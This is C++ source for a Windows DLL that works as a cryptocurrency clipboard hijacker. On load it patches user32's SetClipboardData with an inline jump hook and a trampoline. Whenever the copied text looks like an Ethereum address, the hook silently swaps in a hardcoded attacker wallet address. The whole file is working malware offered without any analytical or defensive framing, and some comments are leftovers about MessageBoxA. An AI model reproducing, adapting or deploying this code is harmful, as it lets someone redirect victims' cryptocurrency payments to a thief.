// dllmain.cpp : Defines the entry point for the DLL application.
#pragma once

#include "pch.h"
#include <stdio.h>
#include <windows.h>
#include <atlstr.h>

#pragma comment(lib,"user32.lib")

typedef int (WINAPI* defTrampolineFunc)(UINT uFormat, HGLOBAL hMem);
LPVOID trampoline_address;

CString clientWalletAddress;
CString mywalletaddress = L"0x8bc6014CbA5af4AeAc456dff20FFe1177ED67134";

bool checkValidAddress(CString address) {
    CString caddress;

    for (int i = 0; i < address.GetLength(); i++) {
        if (address[i] != ' ' && address[i] != '\t' && address[i] != '\r' && address[i] != '\n') {
            caddress += address[i];
        }
    }

    if (caddress.GetLength() != 42) return false;

    if (caddress[0] != '0' || caddress[1] != 'x') return false;

    for (int i = 2; i < address.GetLength(); i++) {
        if (!((address[i] >= 'A' && address[i] <= 'F') || (address[i] >= 'a' && address[i] <= 'f') || (address[i] >= '0' && address[i] <= '9')))
            return false;
    }
    return true;
}

// The proxy function we will jump to after the hook has been installed
int __stdcall proxy_function(UINT uFormat, HGLOBAL hMem)
{
    PVOID lpData = GlobalLock(hMem); // Lock the global memory and get a pointer to the memory
    wchar_t* strData = reinterpret_cast<TCHAR*>(lpData);

    if (lpData != NULL) {
        if (checkValidAddress(strData)) {
            // Now you can copy data to the locked memory
            memcpy_s(lpData, (wcslen(strData) + 1) * sizeof(TCHAR), mywalletaddress, (wcslen(mywalletaddress) + 1) * sizeof(TCHAR)); // Copy the data to the global memory

            GlobalUnlock(hMem); // Unlock the global memory
        }
    }
    // pass to the trampoline with altered arguments which will then return to MessageBoxA
    defTrampolineFunc trampoline = (defTrampolineFunc)trampoline_address;
    return trampoline(uFormat, hMem);
}

void InstallHook()
{
    HINSTANCE hinstLib;
    VOID* proxy_address;
    DWORD* relative_offset;
    DWORD* hook_address;
    DWORD src;
    DWORD dst;
    BYTE patch[5] = { 0 };
    BYTE saved_buffer[5]; // buffer to save the original bytes
    FARPROC function_address = NULL;

    // 1. get memory address of the MessageBoxA function from user32.dll 
    hinstLib = LoadLibraryA("user32.dll");
    function_address = GetProcAddress(hinstLib, "SetClipboardData");

    // 2. save the first 5 bytes into saved_buffer
    ReadProcessMemory(GetCurrentProcess(), function_address, saved_buffer, 5, NULL);

    // 3. overwrite the first 5 bytes with a jump to proxy_function
    proxy_address = &proxy_function;
    src = (DWORD)function_address + 5;
    dst = (DWORD)proxy_address;
    relative_offset = (DWORD*)(dst - src);

    memcpy(patch, "\xE9", 1);
    memcpy(patch + 1, &relative_offset, 4);

    WriteProcessMemory(GetCurrentProcess(), (LPVOID)function_address, patch, 5, NULL);

    // 4. Build the trampoline
    trampoline_address = VirtualAlloc(NULL, 11, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    hook_address = (DWORD*)((DWORD)function_address + 5);
    memcpy((BYTE*)trampoline_address, &saved_buffer, 5);
    memcpy((BYTE*)trampoline_address + 5, "\x68", 1);
    memcpy((BYTE*)trampoline_address + 6, &hook_address, 4);
    memcpy((BYTE*)trampoline_address + 10, "\xC3", 1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        InstallHook();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
